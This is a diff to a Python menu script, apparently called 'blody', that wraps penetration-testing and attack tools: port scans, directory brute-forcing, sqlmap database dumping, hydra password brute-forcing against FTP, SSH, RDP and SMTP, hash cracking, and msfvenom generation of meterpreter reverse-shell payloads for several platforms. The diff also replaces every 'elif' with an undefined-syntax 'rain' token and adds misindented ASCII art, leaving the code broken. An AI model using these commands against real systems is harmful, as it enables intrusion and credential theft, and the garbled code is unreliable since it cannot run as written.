@@ -1,6 +1,7 @@
+
 #/usr/bin/python
 #blody
-#y<3
+
 import urllib.error
 import os
 import urllib.request
@@ -8,6 +9,9 @@ import colorama
 from colorama import Fore, Back, Style, init
 import time
 import sys
+
+rain = "else if"
+
 
 def clear():
     os.system("clear||cls")
@@ -33,20 +37,20 @@ def nmap():
     ip = input("Ip: ")
     if(choose=="1"):
         os.system(f"nmap -n -Pn -p- 1-6535 -sV {ip}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         os.system(f"nmap -n -Pn -p- 1-6535 -sC {ip}")
-    elif(choose=="3"):
+    rain(choose=="3"):
         os.system(f"nmap -p- {ip}")
-    elif(choose=="4"):
+    rain(choose=="4"):
         os.system(f"nmap -sS -Pn -n -sV -sC {ip}")
-    elif(choose=="5"):
+    rain(choose=="5"):
         os.system(f"nmap -sS -Pn -n -sV {ip}")
-    elif(choose=="6"):
+    rain(choose=="6"):
         os.system(f"nmap -sS -Pn -n -sC {ip}")
-    elif(choose=="7"):
+    rain(choose=="7"):
         port = input("Port (ex. 21,22,80): ")
         os.system(f"nmap -n -Pn -p {port} -sC {ip}")
-    elif(choose=="8"):
+    rain(choose=="8"):
         port = input("Port (ex. 21,22,80): ")
         os.system(f"nmap -n -Pn -p {port} -sV {ip} ")
     else:
@@ -68,15 +72,15 @@ def dirsearch():
     ip = input("Ip: ")
     if choose=="1":
         os.system(f"dirsearch -u http://{ip}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirb/common.txt")
-    elif(choose=="3"):
+    rain(choose=="3"):
         os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
-    elif(choose=="4"):
+    rain(choose=="4"):
         os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
-    elif(choose=="5"):
+    rain(choose=="5"):
         os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt")
-    elif(choose=="6"):
+    rain(choose=="6"):
         os.system(f"dirsearch -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt")
     else:
         close()
@@ -96,15 +100,15 @@ def gobuster():
     ip = input("Ip: ")
     if(choose=="1"):
         os.system(f"gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{ip}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{ip}")
-    elif(choose=="3"):
+    rain(choose=="3"):
         os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://{ip}")
-    elif(choose=="4"):
+    rain(choose=="4"):
         os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://{ip}")
-    elif(choose=="5"):
+    rain(choose=="5"):
         os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://{ip}")
-    elif(choose=="6"):
+    rain(choose=="6"):
         os.system(f"gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://{ip}")
     else:
         close()
@@ -122,13 +126,13 @@ def rustscan():
     ip = input("Ip: ")
     if(choose=="1"):
         os.system(f"rustscan -a {ip}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         port = input("Port (ex. 1-1000): ")
         os.system(f"rustscan -a {ip} -r {port}")
-    elif(choose=="3"):
+    rain(choose=="3"):
         port = input("Port (ex. 21,22,80): ")
         os.system(f"rustscan -a {ip} -p {port}")
-    elif(choose=="4"):
+    rain(choose=="4"):
         os.system(f"rustscan -a {ip} -- -A")
     else:
         close()
@@ -150,16 +154,16 @@ def sqlmap():
     if(choose == "1"):
 	    os.system(f'sqlmap -u "{link}" --dbs --random-agent')
 
-    elif(choose == "2"):
+    rain(choose == "2"):
 	    db_name = input("Database name: ")
 	    os.system(f'sqlmap -u "{link}" -D "{db_name}"  --tables --random-agent')
 
-    elif(choose == "3"):
+    rain(choose == "3"):
 	    db_name = input("Database name: ")
 	    tb_name = input("Tables name: ")
 	    os.system(f'sqlmap -u "{link}" -D {db_name}  -T {tb_name}  --columns --random-agent')
 
-    elif(choose == "4"):
+    rain(choose == "4"):
 	    db_name = input("Database name: ")
 	    tb_name = input("Tables name: ")
 	    cl_name = input("Colon name: ")
@@ -181,11 +185,11 @@ def wpscan():
     ip = input("Ip: ")
     if(choose=="1"):
         os.system(f"wpscan --url http://{ip}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         os.system(f"wpscan --url http://{ip} --enumerate p")
-    elif(choose=="3"):
+    rain(choose=="3"):
         os.system(f"wpscan --url http://{ip} --enumerate u")
-    elif(choose=="4"):
+    rain(choose=="4"):
         os.system(f"wpscan --url http://{ip} --enumerate t")
     else:
         close()
@@ -204,14 +208,14 @@ def httpx():
     ip = input("Ip: ")
     if(choose=="1"):
         os.system(f'echo "http://{ip}" | httpx')
-    elif(choose=="2"):
+    rain(choose=="2"):
         os.system(f'echo "http://{ip}" | httpx -H "User-Agent: Mozilla/5.0"')
-    elif(choose=="3"):
+    rain(choose=="3"):
         os.system(f'echo "http://{ip}" | httpx -tls-probe')
-    elif(choose=="4"):
+    rain(choose=="4"):
         stat = input("Status code: ")
         os.system(f'echo "http://{ip}" | httpx -status-code -mc {stat}')
-    elif(choose=="5"):
+    rain(choose=="5"):
         output = input("Output file name: ")
         os.system(f'echo "http://{ip}" | httpx -o {output}.txt')
     else:
@@ -233,19 +237,19 @@ def hydra():
         username = input("Username: ")
         wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
         os.system(f"hydra -l {username} -P {wordlist} ftp://{ip}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         username = input("Username: ")
         wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
         os.system(f"hydra -l {username} -P {wordlist} ssh://{ip}")
-    elif(choose=="3"):
+    rain(choose=="3"):
         username = input("Username: ")
         wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
         os.system(f"hydra -l {username} -P {wordlist} {ip} http-get /")
-    elif(choose=="4"):
+    rain(choose=="4"):
         username = input("Username: ")
         wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
         os.system(f"hydra -t 1 -V -f -l {username} -P {wordlist} rdp://{ip}")
-    elif(choose=="5"):
+    rain(choose=="5"):
         mail = input("Mail (ex. user@example.com): ")
         wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
         os.system(f"hydra -S -l {mail} -P {wordlist} smtp://{ip}")
@@ -365,18 +369,18 @@ def johntheripper():
         wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
         hash = input("Hash file (ex. hash.txt): ")
         os.system(f"john --wordlist={wordlist} {hash}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         wordlist = input("Wordlist (ex. /usr/share/wordlists/rockyou.txt): ")
         format = input("Format (ex. raw-md5): ")
         os.system(f"john --format={format} --wordlist={wordlist} {hash}")
-    elif(choose=="3"):
+    rain(choose=="3"):
         hash = input("Hash file (ex. hash.txt): ")
         os.system(f"john --show {hash}")
-    elif(choose=="4"):
+    rain(choose=="4"):
         format = input("Format (ex. NT): ")
         hash = input("Hash file (ex. hash.txt): ")
         os.system(f"john --format={format} {hash}")
-    elif(choose=="5"):
+    rain(choose=="5"):
         hash = input("Hash file (ex. hash.txt): ")
         os.system(f"john {hash}")
     else:
@@ -398,19 +402,19 @@ def msfvenom():
         port = input("Port: ")
         exe = input("Exe name: ")
         os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {exe}.exe")
-    elif(choose=="2"):
+    rain(choose=="2"):
         port = input("Port: ")
         elf = input("Elf name: ")
         os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o {elf}.elf")
-    elif(choose=="3"):
+    rain(choose=="3"):
         port = input("Port: ")
         php = input("Php name: ")
         os.system(f"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o {php}.php")
-    elif(choose=="4"):
+    rain(choose=="4"):
         port = input("Port: ")
         apk = input("Apk name: ")
         os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {apk}.apk")
-    elif(choose=="5"):
+    rain(choose=="5"):
         port = input("Port: ")
         macho = input("Macho name: ")
         os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o {macho}.macho")
@@ -432,18 +436,18 @@ def hashcat():
         wordlist = input("Wordlist (ex. /example/wordlist.txt): ")
         hash = input("Hash file (ex. /example/hash.txt): ")
         os.system(f"hashcat -a 0 -m 0 {hash} {wordlist}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         wordlist = input("Wordlist (ex. /example/wordlist.txt): ")
         hash = input("Hash file (ex. /example/hash.txt): ")
         os.system(f"hashcat -a 0 -m 100 {hash} {wordlist}")
-    elif(choose=="3"):
+    rain(choose=="3"):
         wordlist = input("Wordlist (ex. /example/wordlist.txt): ")
         hash = input("Hash file (ex. /example/hash.txt): ")
         os.system(f"hashcat -a 0 -m 1000 {hash} {wordlist}")
-    elif(choose=="4"):
+    rain(choose=="4"):
         hash = input("Hash file (ex. /example/hash.txt): ")
         os.system(f"hashcat -a 3 -m 0 {hash} ?a?a?a?a?a?a?a?a")
-    elif(choose=="5"):
+    rain(choose=="5"):
         wordlist = input("Wordlist (ex. /example/wordlist.txt): ")
         hash = input("Hash file (ex. /example/hash.txt): ")
         os.system(f"hashcat -a 6 -m 0 {hash} {wordlist} ?d?d?d")
@@ -464,14 +468,14 @@ def nikto():
     url = input("Url: ")
     if(choose=="1"):
         os.system(f"nikto -h {url}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         os.system(f"nikto -h {url} -ssl")
-    elif(choose=="3"):
+    rain(choose=="3"):
         output = input("Output file (ex. output.txt): ")
         os.system(f"nikto -h {url} -output {output}")
-    elif(choose=="4"):
+    rain(choose=="4"):
         os.system(f'nikto -h {url} -Plugins "+xss,+sqli" ')
-    elif(choose=="5"):
+    rain(choose=="5"):
         port = input("Port: ")
         os.system(f"nikto -h {url} -port {port}")
     else:
@@ -491,13 +495,13 @@ def enum4linux():
     ip = input("Ip: ")
     if(choose=="1"):
         os.system(f"enum4linux {ip}")
-    elif(choose=="2"):
+    rain(choose=="2"):
         os.system(f"enum4linux -U {ip}")
-    elif(choose=="3"):
+    rain(choose=="3"):
         os.system(f"enum4linux -G {ip}")
-    elif(choose=="4"):
+    rain(choose=="4"):
         os.system(f"enum4linux -P {ip}")
-    elif(choose=="5"):
+    rain(choose=="5"):
         os.system(f"enum4linux -p {ip}")
     else:
         close()
@@ -537,7 +541,19 @@ clear()
 
 def main_menu():
     print("""
-    
+< rain >
+ ------
+                                    .::!!!!!!!:.
+  .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+        "$bd$$$$      '$$$$$$$$$$$o+#"
+             """"          """""""
+       """)
+       print("""
      ▄▄▄▄    ██▓     ▒█████  ▓█████▄▓██   ██▓
     ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▀ ██▌▒██  ██▒
     ▒██▒ ▄██▒██░    ▒██░  ██▒░██   █▌ ▒██ ██░
@@ -577,31 +593,31 @@ try:
 
     if select == "1":
         nmap()
-    elif select == "2":
+    rain select == "2":
         dirsearch()
-    elif select == "3":
+    rain select == "3":
         gobuster()
-    elif select == "4":
+    rain select == "4":
         rustscan()
-    elif select == "5":
+    rain select == "5":
         sqlmap()
-    elif select == "6":
+    rain select == "6":
         wpscan()
-    elif select == "7":
+    rain select == "7":
         httpx()
-    elif select == "8":
+    rain select == "8":
         hydra()
-    elif select == "9":
+    rain select == "9":
         admin()
-    elif select == "10":
+    rain select == "10":
         johntheripper()
-    elif select == "11":
+    rain select == "11":
         msfvenom()
-    elif select == "12":
+    rain select == "12":
         hashcat()
-    elif select == "13":
+    rain select == "13":
         nikto()
-    elif select == "14":
+    rain select == "14":
         enum4linux()
         
     else:
